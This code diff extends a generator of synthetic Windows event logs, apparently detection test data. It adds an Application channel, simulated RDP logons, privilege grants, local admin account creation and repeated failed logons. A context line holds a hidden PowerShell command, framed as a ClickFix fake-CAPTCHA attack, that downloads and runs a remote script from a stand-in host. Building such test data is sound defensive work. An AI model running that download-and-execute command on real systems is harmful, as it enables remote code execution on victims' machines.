@@ -68,6 +68,13 @@ CHANNELS = {
         provider="Service Control Manager",
         source_display="Windows Event System Logs",
     ),
+    "application": WindowsChannel(
+        filename="windows_event_application.jsonl",
+        source_group="application_logs",
+        channel="Application",
+        provider="Synthetic-Windows-Application",
+        source_display="SOC Application Logs",
+    ),
     "powershell": WindowsChannel(
         filename="windows_powershell_operational.jsonl",
         source_group="windows_powershell_operational",
@@ -161,6 +168,13 @@ def windows_event(
         "msg": message,
     }
     record.update(event_data)
+    if channel_key == "application":
+        record.update({
+            "timestamp": event_time,
+            "message": message,
+            "hostname": computer,
+            "serviceName": str(event_data.get("ApplicationName", channel.provider)),
+        })
     apply_display_aliases(record)
     return record
 
@@ -220,6 +234,30 @@ def generate_security_events() -> list[dict[str, Any]]:
     host = "DC01.synthetic.example"
     workstation = "WS01.synthetic.example"
     events = [
+        windows_event("security", 4624, computer=workstation, user="Administrator", offset=600, record_id=9001,
+                      message="An account was successfully logged on using Remote Desktop.",
+                      event_data={"TargetUserName": "Administrator", "SubjectUserName": "SYSTEM", "LogonType": "10", "IpAddress": "192.0.2.60", "SourceAddress": "192.0.2.60"}),
+        windows_event("security", 4634, computer=workstation, user="Administrator", offset=605, record_id=9002,
+                      message="An account was logged off.",
+                      event_data={"TargetUserName": "Administrator", "LogonType": "10"}),
+        windows_event("security", 4648, computer=workstation, user="synthetic-user", offset=13, record_id=9003,
+                      message="A logon was attempted using explicit credentials.",
+                      event_data={"SubjectUserName": "synthetic-user", "TargetUserName": "Administrator", "TargetServerName": workstation, "ProcessName": "C:\\Windows\\System32\\runas.exe"}),
+        windows_event("security", 4672, computer=workstation, user="Administrator", offset=14, record_id=9004,
+                      message="Special privileges assigned to new logon.",
+                      event_data={"SubjectUserName": "Administrator", "TargetUserName": "Administrator", "PrivilegeList": "SeBackupPrivilege SeDebugPrivilege"}),
+        windows_event("security", 4720, computer=workstation, user="synthetic-admin", offset=15, record_id=9005,
+                      message="A user account was created.",
+                      event_data={"SubjectUserName": "synthetic-admin", "TargetUserName": "local-maint"}),
+        windows_event("security", 4726, computer=workstation, user="synthetic-admin", offset=16, record_id=9006,
+                      message="A user account was deleted.",
+                      event_data={"SubjectUserName": "synthetic-admin", "TargetUserName": "old-local-user"}),
+        windows_event("security", 4732, computer=workstation, user="synthetic-admin", offset=17, record_id=9007,
+                      message="A member was added to a security-enabled local group: Administrators.",
+                      event_data={"SubjectUserName": "synthetic-admin", "TargetUserName": "Administrators", "MemberName": "local-maint"}),
+        windows_event("security", 4733, computer=workstation, user="synthetic-admin", offset=18, record_id=9008,
+                      message="A member was removed from a security-enabled local group: Remote Desktop Users.",
+                      event_data={"SubjectUserName": "synthetic-admin", "TargetUserName": "Remote Desktop Users", "MemberName": "old-local-user"}),
         windows_event("security", 4719, computer=host, user="synthetic-admin", offset=1, record_id=1001,
                       message="System audit policy was changed.",
                       event_data={"SubjectUserName": "synthetic-admin", "Category": "Object Access", "Subcategory": "Audit File Share", "ChangeType": "Success Removed"}),
@@ -242,6 +280,12 @@ def generate_security_events() -> list[dict[str, Any]]:
                       message="A new process has been created.",
                       event_data={"SubjectUserName": "synthetic-user", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"# ClickFix fake CAPTCHA; iwr https://synthetic.example/p.ps1 | iex\""}),
     ]
+    for index in range(11):
+        events.append(
+            windows_event("security", 4625, computer=workstation, user="target-user", offset=60 + (index // 3), record_id=9100 + index,
+                          message="An account failed to log on.",
+                          event_data={"TargetUserName": "target-user", "LogonType": "3", "IpAddress": "192.0.2.99", "SourceAddress": "192.0.2.99", "Status": "0xC000006D", "SubStatus": "0xC000006A"})
+        )
     for index in range(4):
         events.append(
             windows_event("security", 4771, computer=host, user="sql_svc", offset=6 + index, record_id=1100 + index,
@@ -280,6 +324,17 @@ def generate_system_events() -> list[dict[str, Any]]:
         windows_event("system", 104, computer="WS01.synthetic.example", user="synthetic-admin", offset=21, record_id=2002,
                       message="The System log file was cleared.",
                       event_data={"SubjectUserName": "synthetic-admin"}),
+    ]
+
+
+def generate_application_events() -> list[dict[str, Any]]:
+    return [
+        windows_event("application", 1000, computer="WS01.synthetic.example", user="synthetic-user", offset=22, record_id=2501,
+                      message="Synthetic application error for collection-path validation.",
+                      event_data={"ApplicationName": "synthetic-app.exe", "Status": "0xc0000005"}),
+        windows_event("application", 1001, computer="WS01.synthetic.example", user="synthetic-user", offset=23, record_id=2502,
+                      message="Synthetic Windows Error Reporting event.",
+                      event_data={"ApplicationName": "synthetic-app.exe", "Status": "reported"}),
     ]
 
 
@@ -327,6 +382,7 @@ def generate_all() -> dict[str, list[dict[str, Any]]]:
     return {
         CHANNELS["security"].filename: generate_security_events(),
         CHANNELS["system"].filename: generate_system_events(),
+        CHANNELS["application"].filename: generate_application_events(),
         CHANNELS["powershell"].filename: generate_powershell_events(),
         CHANNELS["defender"].filename: generate_defender_events(),
         CHANNELS["sysmon"].filename: generate_sysmon_events(),
